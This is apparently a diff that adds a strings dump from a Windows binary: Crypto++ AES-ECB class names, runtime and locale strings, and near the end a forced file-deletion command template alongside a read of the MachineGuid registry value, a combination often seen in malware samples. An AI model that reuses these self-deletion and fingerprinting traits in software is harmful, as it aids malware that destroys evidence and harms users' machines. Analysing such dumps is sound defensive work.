+.?AVAlgorithm@CryptoPP@@
+.?AV?$_Node_str@D@std@@
+.?AV?$BlockCipherFinal@$0A@VEnc@Rijndael@CryptoPP@@@CryptoPP@@
+.?AVios_base@std@@
+.?AVBufferedTransformation@CryptoPP@@
+.?AV_Node_end_rep@std@@
+.?AV_System_error_category@std@@
+.?AV_Node_end_group@std@@
+.?AV_Node_back@std@@
+.PEAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@
+.?AVcodecvt_base@std@@
+.?AVSymmetricCipher@CryptoPP@@
+.?AVAlgorithmParametersBase@CryptoPP@@
+.P6AXPEAPEAX@Z
+.?AV?$_Iosb@H@std@@
+.?AV?$basic_ofstream@DU?$char_traits@D@std@@@std@@
+.?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@
+.?AV_Node_base@std@@
+.?AVECB_OneWay@CryptoPP@@
+.?AVSink@CryptoPP@@
+.?AURijndael_Info@CryptoPP@@
+.?AV?$BlockCipherFinal@$00VDec@Rijndael@CryptoPP@@@CryptoPP@@
+.?AV?$FixedBlockSize@$0BA@@CryptoPP@@
+.?AVStringStore@CryptoPP@@
+.?AVStore@CryptoPP@@
+.?AVException@CryptoPP@@
+.?AV?$TwoBases@VBlockCipher@CryptoPP@@URijndael_Info@2@@CryptoPP@@
+.?AV_Root_node@std@@
+.?AV?$CipherModeFinalTemplate_CipherHolder@V?$BlockCipherFinal@$0A@VEnc@Rijndael@CryptoPP@@@CryptoPP@@VECB_OneWay@2@@CryptoPP@@
+.?AVFilter@CryptoPP@@
+.?AV?$SimpleKeyingInterfaceImpl@V?$TwoBases@VBlockCipher@CryptoPP@@URijndael_Info@2@@CryptoPP@@V12@@CryptoPP@@
+.?AV?$InputRejecting@VBufferedTransformation@CryptoPP@@@CryptoPP@@
+.?AV?$ClonableImpl@V?$BlockCipherFinal@$0A@VEnc@Rijndael@CryptoPP@@@CryptoPP@@VEnc@Rijndael@2@@CryptoPP@@
+.?AV?$basic_istream@DU?$char_traits@D@std@@@std@@
+.?AUInputRejected@?$InputRejecting@VBufferedTransformation@CryptoPP@@@CryptoPP@@
+.?AVBlockCipher@CryptoPP@@
+.?AVClonable@CryptoPP@@
+.?AV?$basic_ios@DU?$char_traits@D@std@@@std@@
+.?AV?$StringSinkTemplate@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@CryptoPP@@
+.?AVInvalidArgument@CryptoPP@@
+.?AV?$ObjectHolder@V?$BlockCipherFinal@$0A@VEnc@Rijndael@CryptoPP@@@CryptoPP@@@CryptoPP@@
+.?AV_Node_assert@std@@
+.?AV?$AlgorithmParametersTemplate@VConstByteArrayParameter@CryptoPP@@@CryptoPP@@
+.?AVDec@Rijndael@CryptoPP@@
+.?AV?$AlgorithmImpl@VECB_OneWay@CryptoPP@@V?$CipherModeFinalTemplate_CipherHolder@V?$BlockCipherFinal@$00VDec@Rijndael@CryptoPP@@@CryptoPP@@VECB_OneWay@2@@2@@CryptoPP@@
+.?AVNotCopyable@CryptoPP@@
+.?AV?$ObjectHolder@V?$BlockCipherFinal@$00VDec@Rijndael@CryptoPP@@@CryptoPP@@@CryptoPP@@
+.?AV_Ref_count_base@std@@
+.?AVEnc@Rijndael@CryptoPP@@
+.?AV_Node_rep@std@@
+.?AVNotImplemented@CryptoPP@@
+.?AV?$ClonableImpl@V?$BlockCipherFinal@$00VDec@Rijndael@CryptoPP@@@CryptoPP@@VDec@Rijndael@2@@CryptoPP@@
+.?AV?$VariableKeyLength@$0BA@$0BA@$0CA@$07$03$0A@@CryptoPP@@
+.?AV?$AlgorithmImpl@VECB_OneWay@CryptoPP@@V?$CipherModeFinalTemplate_CipherHolder@V?$BlockCipherFinal@$0A@VEnc@Rijndael@CryptoPP@@@CryptoPP@@VECB_OneWay@2@@2@@CryptoPP@@
+.?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@
+.?AV?$BlockCipherImpl@URijndael_Info@CryptoPP@@VBlockCipher@2@@CryptoPP@@
+.?AVValueTypeMismatch@NameValuePairs@CryptoPP@@
+.?AVWaitable@CryptoPP@@
+.?AVConstByteArrayParameter@CryptoPP@@
+.?AVSource@CryptoPP@@
+.?AV?$Bufferless@VSink@CryptoPP@@@CryptoPP@@
+.?AV?$_Node_class@DV?$regex_traits@D@std@@@std@@
+.?AVParameterNotUsed@AlgorithmParametersBase@CryptoPP@@
+.?AV?$AlgorithmImpl@V?$SimpleKeyingInterfaceImpl@V?$TwoBases@VBlockCipher@CryptoPP@@URijndael_Info@2@@CryptoPP@@V12@@CryptoPP@@V12@@CryptoPP@@
+.?AV_Node_capture@std@@
+.?AV_Node_endif@std@@
+.?AUInputRejected@?$InputRejecting@VFilter@CryptoPP@@@CryptoPP@@
+.?AVStringSource@CryptoPP@@
+.?AVNameValuePairs@CryptoPP@@
+.?AVNullNameValuePairs@CryptoPP@@
+.?AVArraySink@CryptoPP@@
+.?AVBitBucket@CryptoPP@@
+.?AVInvalidCiphertext@CryptoPP@@
+.?AUNoChannelSupport@BufferedTransformation@CryptoPP@@
+.?AVInvalidKeyLength@CryptoPP@@
+.?AVInvalidDataFormat@CryptoPP@@
+.?AVAlgorithmParameters@CryptoPP@@
+.?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@
+.?AV?$AlgorithmParametersTemplate@W4BlockPaddingScheme@BlockPaddingSchemeDef@CryptoPP@@@CryptoPP@@
+.?AUFilterPutSpaceHelper@CryptoPP@@
+.?AUBlockPaddingSchemeDef@CryptoPP@@
+.?AVStreamTransformationFilter@CryptoPP@@
+.?AVFilterWithBufferedInput@CryptoPP@@
+.?AW4BlockPaddingScheme@BlockPaddingSchemeDef@CryptoPP@@
+.?AVByteArrayParameter@CryptoPP@@
+.?AVAuthenticatedSymmetricCipher@CryptoPP@@
+.?AUBlockingInputOnly@BufferedTransformation@CryptoPP@@
+.?AVWalker@ByteQueue@CryptoPP@@
+.?AV?$Bufferless@VBufferedTransformation@CryptoPP@@@CryptoPP@@
+.?AVByteQueue@CryptoPP@@
+.?AV?$AutoSignaling@VBufferedTransformation@CryptoPP@@@CryptoPP@@
+.?AVMessageQueue@CryptoPP@@
+<?xml version='1.0' encoding='UTF-8' standalone='yes'?>
+<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level='asInvoker' uiAccess='false' />
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+kernel32.dll
+zh-CHS
+az-AZ-Latn
+uz-UZ-Latn
+kok-IN
+syr-SY
+div-MV
+quz-BO
+sr-SP-Latn
+az-AZ-Cyrl
+uz-UZ-Cyrl
+quz-EC
+sr-SP-Cyrl
+quz-PE
+smj-NO
+bs-BA-Latn
+smj-SE
+sr-BA-Latn
+sma-NO
+sr-BA-Cyrl
+sma-SE
+sms-FI
+smn-FI
+zh-CHT
+az-az-cyrl
+az-az-latn
+bs-ba-latn
+div-mv
+kok-in
+quz-bo
+quz-ec
+quz-pe
+sma-no
+sma-se
+smj-no
+smj-se
+smn-fi
+sms-fi
+sr-ba-cyrl
+sr-ba-latn
+sr-sp-cyrl
+sr-sp-latn
+syr-sy
+uz-uz-cyrl
+uz-uz-latn
+zh-chs
+zh-cht
+api-ms-win-core-synch-l1-2-0.dll
+api-ms-win-core-fibers-l1-1-1
+api-ms-win-core-synch-l1-2-0
+kernel32
+api-ms-
+(null)
+         (((((                  H
+         (((((                  H
+      (                          
+mscoree.dll
+LC_ALL
+LC_COLLATE
+LC_CTYPE
+LC_MONETARY
+LC_NUMERIC
+LC_TIME
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+api-ms-win-core-datetime-l1-1-1
+api-ms-win-core-file-l1-2-2
+api-ms-win-core-localization-l1-2-1
+api-ms-win-core-localization-obsolete-l1-2-0
+api-ms-win-core-processthreads-l1-1-2
+api-ms-win-core-string-l1-1-0
+api-ms-win-core-sysinfo-l1-2-1
+api-ms-win-core-winrt-l1-1-0
+api-ms-win-core-xstate-l2-1-0
+api-ms-win-rtcore-ntuser-window-l1-1-0
+api-ms-win-security-systemfunctions-l1-1-0
+ext-ms-win-ntuser-dialogbox-l1-1-0
+ext-ms-win-ntuser-windowstation-l1-1-0
+advapi32
+api-ms-win-appmodel-runtime-l1-1-2
+user32
+ext-ms-
+american
+american english
+american-english
+australian
+belgian
+canadian
+chinese
+chinese-hongkong
+chinese-simplified
+chinese-singapore
+chinese-traditional
+dutch-belgian
+english-american
+english-aus
+english-belize
+english-can
+english-caribbean
+english-ire
+english-jamaica
+english-nz
+english-south africa
+english-trinidad y tobago
+english-uk
+english-us
+english-usa
+french-belgian
+french-canadian
+french-luxembourg
+french-swiss
+german-austrian
+german-lichtenstein
+german-luxembourg
+german-swiss
+irish-english
+italian-swiss
+norwegian
+norwegian-bokmal
+norwegian-nynorsk
+portuguese-brazilian
+spanish-argentina
+spanish-bolivia
+spanish-chile
+spanish-colombia
+spanish-costa rica
+spanish-dominican republic
+spanish-ecuador
+spanish-el salvador
+spanish-guatemala
+spanish-honduras
+spanish-mexican
+spanish-modern
+spanish-nicaragua
+spanish-panama
+spanish-paraguay
+spanish-peru
+spanish-puerto rico
+spanish-uruguay
+spanish-venezuela
+swedish-finland
+america
+britain
+england
+great britain
+holland
+hong-kong
+new-zealand
+pr china
+pr-china
+puerto-rico
+slovak
+south africa
+south korea
+south-africa
+south-korea
+trinidad & tobago
+united-kingdom
+united-states
+CONOUT$
+cmd.exe /C Del /f /q "%s"
+MachineGuid
+SOFTWARE\Microsoft\Cryptography
+xdigit
+////////\\\\\\\\
